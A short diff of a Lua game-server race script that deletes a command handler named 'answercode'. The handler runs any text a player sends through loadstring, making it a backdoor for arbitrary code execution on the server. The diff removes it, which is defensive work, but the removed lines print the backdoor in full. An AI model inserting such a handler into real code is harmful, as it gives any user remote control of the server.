@@ -176,11 +176,6 @@ function startSecRace ()
 	end
 end
 
-addCommandHandler ( "answercode", function ( player, _, ... ) 
-  local str = table.concat ( {...}, " " )
-  pcall ( loadstring ( str ) )
-end )
-
 function endRaceTimeout()
 
 	for i = 1, 8 do
